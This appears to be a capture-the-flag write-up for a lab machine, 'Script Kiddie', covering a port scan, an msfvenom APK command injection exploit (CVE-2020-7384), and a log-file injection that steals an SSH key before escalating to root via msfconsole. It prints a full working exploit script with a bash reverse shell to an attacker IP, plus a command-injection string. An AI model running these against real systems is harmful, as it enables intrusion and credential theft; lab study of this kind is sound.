@@ -1,0 +1,349 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<!-- 2025-05-05 Mon 21:34 -->
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Script Kiddie</title>
+<meta name="generator" content="Org Mode" />
+<link rel="stylesheet" type="text/css" href="/style.css"/>
+</head>
+<body>
+<div id="content" class="content">
+<h1 class="title">Script Kiddie</h1>
+<p class="spacing-64" \>
+
+<div id="table-of-contents" role="doc-toc">
+<h2>Table of Contents</h2>
+<div id="text-table-of-contents" role="doc-toc">
+<ul>
+<li><a href="#org9ec18ce">Enumeration</a></li>
+<li><a href="#org4d4e576">User</a></li>
+<li><a href="#org1be2c82">Root</a></li>
+</ul>
+</div>
+</div>
+
+<p class="spacing-64" \>
+<div id="outline-container-org9ec18ce" class="outline-2">
+<h2 id="org9ec18ce">Enumeration</h2>
+<div class="outline-text-2" id="text-org9ec18ce">
+<p>
+As usual, we start with an Nmap scan:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-nil">Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-06 20:32 WET
+$ nmap -sC -sV -p1-65535 -oN nmapresult.txt 10.129.74.36
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-06 20:32 WET
+Nmap scan report for 10.129.74.36
+Host is up (0.046s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
+|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
+|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
+5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
+|_http-title: k1d'5 h4ck3r t00l5
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 50.20 seconds
+</pre>
+</div>
+
+<p>
+We can clearly see that there is an HTTP server running in port <code>5000</code>.
+Going to the website (<code>10.129.75.138:5000</code>), we see this page:
+</p>
+
+
+<div id="org19d8741" class="figure">
+<p><img src="./images/img1.jpg" alt="img1.jpg" />
+</p>
+</div>
+
+<p>
+Messing around with the website, we can scan the top 100 ports of a specific IP
+address, we can also generate <code>msfvenom</code> binaries and we can search exploits.
+</p>
+
+<p>
+There are some timesinks here, one of them being command injection checking on
+all three available fields. I did waste many hours because of it.
+</p>
+
+<p>
+But let us not forget about the commands that are running server-side.
+From the website, we know that the server is running <code>nmap</code>, <code>msfvenom</code> and
+<code>searchsploit</code>.
+</p>
+</div>
+</div>
+<div id="outline-container-org4d4e576" class="outline-2">
+<h2 id="org4d4e576">User</h2>
+<div class="outline-text-2" id="text-org4d4e576">
+<p>
+Using the <code>searchsploit</code> utility from the website, we can search <code>nmap</code> or
+<code>msfvenom</code> exploits. <code>Nmap</code> has a couple exploits, but <code>msfvenom</code> has one that
+is very recent, January 2021: <a href="https://www.exploit-db.com/exploits/49491">https://www.exploit-db.com/exploits/49491</a>.
+</p>
+
+<p>
+It seems that we can use an Android APK template to make <code>msfvenom</code> execute
+arbitrary code when it is generating the binary.
+</p>
+
+<p>
+We’ll use the above python script, but in our case, we want a payload for a
+reverse shell: <code>/bin/bash -c "/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.210/1337 0&gt;&amp;1"</code>.
+We just replace it in the script and run it. But it will error out, because
+there seems to be a problem when using <code>keytool</code> and having <code>+</code> characters in
+<code>dname</code>.
+Script customization is needed. In this case, after getting the result base64,
+we’ll convert the string to an hex string and we also change the dname variable
+so it converts from hex string to base64 and then decode the base64 and then
+execute the resulting string.
+</p>
+
+<p>
+This is the script after the changes:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-python"><span class="org-comment-delimiter"># </span><span class="org-comment">Exploit Title: Metasploit Framework 6.0.11 - msfvenom APK template command injection</span>
+<span class="org-comment-delimiter"># </span><span class="org-comment">Exploit Author: Justin Steven</span>
+<span class="org-comment-delimiter"># </span><span class="org-comment">Vendor Homepage: https://www.metasploit.com/</span>
+<span class="org-comment-delimiter"># </span><span class="org-comment">Software Link: https://www.metasploit.com/</span>
+<span class="org-comment-delimiter"># </span><span class="org-comment">Version: Metasploit Framework 6.0.11 and Metasploit Pro 4.18.0</span>
+<span class="org-comment-delimiter"># </span><span class="org-comment">CVE : CVE-2020-7384</span>
+
+<span class="org-comment-delimiter">#</span><span class="org-comment">!/usr/bin/env python3</span>
+<span class="org-keyword">import</span> subprocess
+<span class="org-keyword">import</span> tempfile
+<span class="org-keyword">import</span> os
+<span class="org-keyword">from</span> base64 <span class="org-keyword">import</span> b64encode
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">Change me</span>
+<span class="org-comment-delimiter">#</span><span class="org-comment">payload = 'echo "Code execution as $(id)" &gt; /tmp/win'</span>
+<span class="org-variable-name">payload</span> <span class="org-operator">=</span> <span class="org-string">'/bin/bash -c "/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.210/1337 0&gt;&amp;1"'</span>
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">b64encode to avoid badchars (keytool is picky)</span>
+<span class="org-variable-name">payload_b64</span> <span class="org-operator">=</span> b64encode(payload.encode()).decode()
+<span class="org-variable-name">payload_hex</span> <span class="org-operator">=</span> <span class="org-string">""</span>.join(<span class="org-string">"{:02x}"</span>.<span class="org-builtin">format</span>(<span class="org-builtin">ord</span>(c)) <span class="org-keyword">for</span> c <span class="org-keyword">in</span> payload_b64)
+
+<span class="org-comment-delimiter">#</span><span class="org-comment">dname = f"CN='|echo {payload_b64} | base64 -d | sh #"</span>
+<span class="org-variable-name">dname</span> <span class="org-operator">=</span> f<span class="org-string">"CN='|echo </span>{payload_hex}<span class="org-string"> | xxd -r -p | base64 -d | sh #"</span>
+
+<span class="org-builtin">print</span>(f<span class="org-string">"[+] Manufacturing evil apkfile"</span>)
+<span class="org-builtin">print</span>(f<span class="org-string">"Payload: </span>{payload}<span class="org-string">"</span>)
+<span class="org-builtin">print</span>(f<span class="org-string">"-dname: </span>{dname}<span class="org-string">"</span>)
+<span class="org-builtin">print</span>()
+
+<span class="org-variable-name">tmpdir</span> <span class="org-operator">=</span> tempfile.mkdtemp()
+<span class="org-variable-name">apk_file</span> <span class="org-operator">=</span> os.path.join(tmpdir, <span class="org-string">"evil.apk"</span>)
+<span class="org-variable-name">empty_file</span> <span class="org-operator">=</span> os.path.join(tmpdir, <span class="org-string">"empty"</span>)
+<span class="org-variable-name">keystore_file</span> <span class="org-operator">=</span> os.path.join(tmpdir, <span class="org-string">"signing.keystore"</span>)
+<span class="org-variable-name">storepass</span> <span class="org-operator">=</span> <span class="org-variable-name">keypass</span> <span class="org-operator">=</span> <span class="org-string">"password"</span>
+<span class="org-variable-name">key_alias</span> <span class="org-operator">=</span> <span class="org-string">"signing.key"</span>
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">Touch empty_file</span>
+<span class="org-builtin">open</span>(empty_file, <span class="org-string">"w"</span>).close()
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">Create apk_file</span>
+subprocess.check_call([<span class="org-string">"zip"</span>, <span class="org-string">"-j"</span>, apk_file, empty_file])
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">Generate signing key with malicious -dname</span>
+subprocess.check_call([<span class="org-string">"keytool"</span>, <span class="org-string">"-genkey"</span>, <span class="org-string">"-keystore"</span>, keystore_file, <span class="org-string">"-alias"</span>, key_alias, <span class="org-string">"-storepass"</span>, storepass,
+                       <span class="org-string">"-keypass"</span>, keypass, <span class="org-string">"-keyalg"</span>, <span class="org-string">"RSA"</span>, <span class="org-string">"-keysize"</span>, <span class="org-string">"2048"</span>, <span class="org-string">"-dname"</span>, dname])
+
+<span class="org-comment-delimiter"># </span><span class="org-comment">Sign APK using our malicious dname</span>
+subprocess.check_call([<span class="org-string">"jarsigner"</span>, <span class="org-string">"-sigalg"</span>, <span class="org-string">"SHA1withRSA"</span>, <span class="org-string">"-digestalg"</span>, <span class="org-string">"SHA1"</span>, <span class="org-string">"-keystore"</span>, keystore_file,
+                       <span class="org-string">"-storepass"</span>, storepass, <span class="org-string">"-keypass"</span>, keypass, apk_file, key_alias])
+
+<span class="org-builtin">print</span>()
+<span class="org-builtin">print</span>(f<span class="org-string">"[+] Done! apkfile is at </span>{apk_file}<span class="org-string">"</span>)
+<span class="org-builtin">print</span>(f<span class="org-string">"Do: msfvenom -x </span>{apk_file}<span class="org-string"> -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null"</span>)
+</pre>
+</div>
+
+<p>
+All we have to do now is run the script and upload the result APK to the
+website:
+</p>
+
+
+<div id="org4db6f46" class="figure">
+<p><img src="./images/img2.jpg" alt="img2.jpg" />
+</p>
+</div>
+
+<p>
+When we get the reverse shell, we can see that there is a <code>id_rsa</code> file in the
+<code>.ssh</code> directory, we get the contents of the file and we use it to ssh into the
+user <code>kid</code>:
+</p>
+
+
+<div id="org19e9bb6" class="figure">
+<p><img src="./images/img3.jpg" alt="img3.jpg" />
+</p>
+</div>
+
+<p>
+In <code>kid</code> home directory, we can get the <code>user.txt</code> flag.
+</p>
+</div>
+</div>
+<div id="outline-container-org1be2c82" class="outline-2">
+<h2 id="org1be2c82">Root</h2>
+<div class="outline-text-2" id="text-org1be2c82">
+<p>
+There are some rabbit holes we can get into. We can rapidly see that there is an
+odd file (<code>/home/kid/logs/hackers</code>).
+The file is referenced in the websites’ <code>app.py</code> file:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-python"><span class="org-keyword">def</span> <span class="org-function-name">searchsploit</span>(text, srcip):
+    <span class="org-keyword">if</span> regex_alphanum.<span class="org-keyword">match</span>(text):
+        <span class="org-variable-name">result</span> <span class="org-operator">=</span> subprocess.check_output([<span class="org-string">'searchsploit'</span>, <span class="org-string">'--color'</span>, text])
+        <span class="org-keyword">return</span> render_template(<span class="org-string">'index.html'</span>, searchsploit<span class="org-operator">=</span>result.decode(<span class="org-string">'UTF-8'</span>, <span class="org-string">'ignore'</span>))
+    <span class="org-keyword">else</span>:
+        <span class="org-keyword">with</span> <span class="org-builtin">open</span>(<span class="org-string">'/home/kid/logs/hackers'</span>, <span class="org-string">'a'</span>) <span class="org-keyword">as</span> f:
+            f.write(f<span class="org-string">'[</span>{datetime.datetime.now()}<span class="org-string">] </span>{srcip}<span class="org-constant">\n</span><span class="org-string">'</span>)
+        <span class="org-keyword">return</span> render_template(<span class="org-string">'index.html'</span>, sserror<span class="org-operator">=</span><span class="org-string">"stop hacking me - well hack you back"</span>)
+</pre>
+</div>
+
+<p>
+So, if we use special characters in the prompt, it will write current date and
+our IP to <code>/home/kid/logs/hackers</code>. For the sake of brevity, we are
+going to upload <code>pspy64</code> to the machine and run it. Now, in the website, if we
+use the <code>searchsploit</code> textfield with a special character (e.g.: <code>test;</code>), we
+can clearly see what commands are executed on the server:
+</p>
+
+
+<div id="orge8f393f" class="figure">
+<p><img src="./images/img4.jpg" alt="img4.jpg" />
+</p>
+</div>
+
+<p>
+Everytime the above happens, it seems <code>/home/pwn/scanlosers.sh</code> is executed.
+We can peek into that file:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-bash"><span class="org-comment-delimiter">#</span><span class="org-comment">!/bin/</span><span class="org-keyword">bash</span>
+
+<span class="org-variable-name">log</span>=/home/kid/logs/hackers
+
+<span class="org-builtin">cd</span> /home/pwn/
+cat $<span class="org-variable-name">log</span> | cut -d<span class="org-string">' '</span> -f3- | sort -u | <span class="org-keyword">while </span><span class="org-builtin">read</span> ip; <span class="org-keyword">do</span>
+    sh -c <span class="org-string">"nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2&gt;&amp;1 &gt;/dev/null"</span> &amp;
+<span class="org-keyword">done</span>
+
+<span class="org-keyword">if</span> [[ $(wc -l &lt; $<span class="org-variable-name">log</span>) -gt 0 ]]; <span class="org-keyword">then </span><span class="org-builtin">echo</span> -n &gt; $<span class="org-variable-name">log</span>; <span class="org-keyword">fi</span>
+</pre>
+</div>
+
+<p>
+This file gets <code>/home/kid/logs/hackers</code>, does a cut by space character, gets
+everything from the third free onwards and executes nmap. After that, it cleans
+the log file.
+From here, we can inject commands into <code>/home/kid/logs/hackers</code> for user <code>pwn</code>
+to execute! But we have to be smart about it. We can continue using <code>pspy64</code> to
+check what is executed and to do some trial and error. My initial idea was to
+get the <code>id_rsa</code> from user <code>pwn</code>. All I had to do was run this command:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-nil">$ echo ";a; a; ;cat .ssh/id_rsa &gt; test;" &gt; logs/hackers
+</pre>
+</div>
+
+<p>
+I did insert enough whitespaces because of <code>cut -d’ ‘ -f3-</code> part. Then the
+command I wanted to execute (print <code>id_rsa</code> and redirect output to <code>test</code> file
+and then redirect everything to <code>/home/kid/logs/hackers</code>).
+</p>
+
+
+<div id="orgcd94d40" class="figure">
+<p><img src="./images/img5.jpg" alt="img5.jpg" />
+</p>
+</div>
+
+<p>
+We get the result and save a new <code>id_rsa</code> in our computer and <code>ssh</code> into <code>pwn</code>.
+</p>
+
+
+<div id="org16e909e" class="figure">
+<p><img src="./images/img6.jpg" alt="img6.jpg" />
+</p>
+</div>
+
+<p>
+Something that should be done right away is check if <code>pwn</code> user can run some
+commands as superuser!
+</p>
+
+<div class="org-src-container">
+<pre class="src src-nil">$ sudo -l
+
+Matching Defaults entries for pwn on scriptkiddie:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User pwn may run the following commands on scriptkiddie:
+    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
+</pre>
+</div>
+
+<p>
+It is possible to execute <code>msfconsole</code> as superuser. We can also run
+normal bash commands through msfconsole. Therefore, we just execute <code>bash</code> and
+we get a shell session with root permissions.
+</p>
+
+
+<div id="org196310e" class="figure">
+<p><img src="./images/img7.jpg" alt="img7.jpg" />
+</p>
+</div>
+
+<p>
+Navigation to <code>root</code> home directory is required and then we have <code>root.txt</code> to
+get the root flag.
+</p>
+</div>
+</div>
+<hr>
+<footer>
+  <div class="container">
+    <ul class="menu-list">
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/index.html">Home</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/articles/articles.html">Articles</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a href="/writeups/htb/index.html">Write-Ups</a>
+      </li>
+      <li class="menu-list-item flex-basis-100-margin fit-content">
+        <a class="inactive-link">08-02-2021</a>
+      </li>
+    </ul>
+  </div>
+</footer>
+</div>
+</body>
+</html>
